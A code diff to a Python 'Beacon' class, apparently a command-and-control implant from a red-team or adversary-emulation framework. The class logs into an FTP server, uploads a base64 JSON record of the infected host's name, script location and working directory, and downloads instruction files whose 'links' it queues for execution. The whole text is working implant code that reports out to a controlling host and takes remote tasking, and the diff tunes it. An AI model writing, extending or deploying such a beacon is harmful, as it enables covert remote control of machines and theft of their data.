@@ -40,7 +40,6 @@ class Beacon:
     def __init__(self, host, user, password, jitter):
         self.ftp = FTP(host)
         self.ftp.login(user, password)
-        self.ftp.set_pasv(False)
         self.jitter = jitter
         self.target = host
         self.links = []
@@ -53,7 +52,7 @@ class Beacon:
 
     def stor(self):
         b = json.dumps(self._build_beacon('%s:21' % self.target, self.links))
-        payload = base64.urlsafe_b64encode(b.encode())
+        payload = base64.b64encode(b.encode())
         self.ftp.storlines('STOR %s.json' % socket.gethostname(), io.BytesIO(payload))
         self.links = []
 
@@ -71,8 +70,7 @@ class Beacon:
                 self.links.extend(instructions['links'])
         self.ftp.retrlines('RETR %s.json' % socket.gethostname(), handle)
 
-    @staticmethod
-    def _build_beacon(target, links=[]):
+    def _build_beacon(self, target, links=[]):
         return dict(
             Name=socket.gethostname(),
             Location=__file__,
@@ -81,7 +79,8 @@ class Beacon:
             Range='red',
             Pwd=os.getcwd(),
             Target=target,
-            Links=links
+            Links=links,
+            Sleep=self.jitter
         )
 
     @staticmethod
